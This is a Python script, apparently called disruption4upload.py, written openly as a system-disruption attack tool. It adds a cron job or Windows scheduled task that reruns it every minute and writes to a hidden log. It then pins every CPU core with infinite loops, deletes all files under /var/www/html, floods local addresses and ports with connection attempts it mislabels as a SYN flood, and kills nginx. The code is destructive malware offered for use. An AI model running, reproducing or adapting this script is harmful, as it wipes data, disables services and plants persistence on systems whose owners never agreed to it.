import os
import time
import socket
import threading
import subprocess
import multiprocessing
import platform
import stat
import random
import psutil  # You may need to install this library

# Discover local IP addresses and open ports
def discover_local_ips_and_ports():
    local_ips = []
    open_ports = set()

    # Get the hostname and local IP addresses
    hostname = socket.gethostname()
    local_ips.append(socket.gethostbyname(hostname))

    # Scan for open ports
    for conn in psutil.net_connections(kind='inet'):
        local_ips.append(conn.laddr.ip)
        open_ports.add(conn.laddr.port)

    return local_ips, list(open_ports)

# Function to ensure the script itself has execute permissions (Linux only)
def ensure_executable():
    if platform.system() == "Linux":
        current_file = os.path.abspath(__file__)
        st = os.stat(current_file)
        if not st.st_mode & stat.S_IXUSR:
            os.chmod(current_file, st.st_mode | stat.S_IXUSR)
            print(f"Made {current_file} executable")

# Function to add a cron job for Linux or a scheduled task for Windows
def add_cron_job():
    if platform.system() == "Linux":
        ensure_executable()
        cron_job = "* * * * * /usr/bin/python3 /tmp/disruption4upload.py >> /var/tmp/.hidden_log 2>&1"
        os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
        print("Cron job added to run the script every minute")
    elif platform.system() == "Windows":
        task_name = "Disruption4UploadTask"
        task_command = f"python {os.path.abspath(__file__)}"
        os.system(f'schtasks /create /tn {task_name} /tr "{task_command}" /sc minute /mo 1')
        print("Scheduled task added to run the script every minute")

# Function to stress the CPU with an infinite loop
def cpu_stress():
    while True:
        pass  # Infinite loop to consume CPU resources

# Function to delete files in the specified directory
def delete_files(path):
    if platform.system() == "Windows" and not os.path.exists(path):
        print(f"Path {path} does not exist.")
        return
    for root, dirs, files in os.walk(path):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
                print(f"Deleted file: {os.path.join(root, file)}")
            except Exception as e:
                print(f"Error deleting file {file}: {e}")

# Function to send SYN Flood attacks to the target IP and port
def syn_flood(target_ip, target_port):
    if platform.system() == "Windows":
        return  # SYN Flood is not supported on Windows
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
            print(f"SYN Flood sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending SYN Flood to {target_ip}:{target_port}: {e}")

# Function to terminate the specified process
def kill_process(process_name):
    if platform.system() == "Windows":
        os.system(f'taskkill /F /IM {process_name}.exe')
    elif platform.system() == "Linux":
        try:
            subprocess.call(['pkill', '-f', process_name])
            print(f"Process {process_name} killed")
        except Exception as e:
            print(f"Error killing process {process_name}: {e}")

# Function to perform system disruption attacks
def disrupt_system(important_directory, critical_process):
    local_ips, open_ports = discover_local_ips_and_ports()

    if platform.system() == "Linux":
        num_cores = multiprocessing.cpu_count()
        for _ in range(num_cores):
            p = multiprocessing.Process(target=cpu_stress)
            p.start()

        threading.Thread(target=delete_files, args=(important_directory,)).start()

        for ip in local_ips:
            for port in open_ports:
                threading.Thread(target=syn_flood, args=(ip, port)).start()

        threading.Thread(target=kill_process, args=(critical_process,)).start()

        print("\n" + "="*40)
        print("System Disruption Attack Initiated")
        print("="*40)
        print("Local IPs:", local_ips)
        print("Open Ports:", open_ports)
        print("Important Directory:", important_directory)
        print("Critical Process Name:", critical_process)
        print("="*40)
        print("Attack in progress...")
        print("="*40)
        while True:
            time.sleep(10)
            print("Monitoring attack progress...")

if __name__ == "__main__":
    ensure_executable()
    add_cron_job()
    disrupt_system("/var/www/html", "nginx")